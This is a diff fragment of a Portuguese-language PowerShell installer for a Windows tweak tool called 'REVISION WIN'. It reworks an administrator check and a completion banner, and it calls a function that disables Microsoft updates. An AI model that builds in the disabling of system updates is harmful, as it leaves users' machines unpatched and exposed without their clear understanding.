-    Create-Structure
-    Disable-MicrosoftUpdates
-    Install-RevisionLogo
-    Install-RevisionService
-    Optimize-RAM
-    
-    Write-Log ""
-    Write-Log "╔════════════════════════════════════════════════════════════╗" -Color "Green"
-    Write-Log "║                    INSTALAÇÃO CONCLUÍDA!                    ║" -Color "Green"
-    Write-Log "╠════════════════════════════════════════════════════════════╣" -Color "Green"
-    Write-Log "║                                                             ║" -Color "Green"
-    Write-Log "║   ✅ Microsoft Update: DESATIVADO                           ║" -Color "Green"
-    Write-Log "║   ✅ REVISION WIN Service: ATIVO                            ║" -Color "Green"
-    Write-Log "║   ✅ RAM liberada: Serviços parasitas removidos             ║" -Color "Green"
-    Write-Log "║   ✅ WinVer customizado: REVISION WIN                       ║" -Color "Green"
-    Write-Log "║                                                             ║" -Color "Green"
-    Write-Log "║   Para testar: digite 'winver' no CMD                      ║" -Color "Yellow"
-    Write-Log "║                                                             ║" -Color "Green"
-    Write-Log "╚════════════════════════════════════════════════════════════╝" -Color "Green"
-    Write-Log ""
-    Write-Log "REVISION WIN está no controle. A Microsoft obedece agora." -Color "Magenta"
-    
-    # Mostrar logo final
-    if (Test-Path "$ScriptDir\revision-logo.txt") {
-        Get-Content "$ScriptDir\revision-logo.txt" | Write-Host -ForegroundColor Cyan
+    # Verifica se é admin
+    if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
+        [System.Windows.Forms.MessageBox]::Show("REVISION WIN precisa ser executado como Administrador!`n`nClique com botão direito > Executar como administrador", "Permissão Necessária", "OK", "Error")
+        exit 1
     }
+    
+    Show-InstallWindow
 }
 
-# Executar como admin
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
-    Write-Host "❌ Execute este script como ADMINISTRADOR!" -ForegroundColor Red
-    Write-Host "   Clique com botão direito > Executar como administrador" -ForegroundColor Yellow
-    pause
-    exit 1
-}
-
+# Executar
 Main
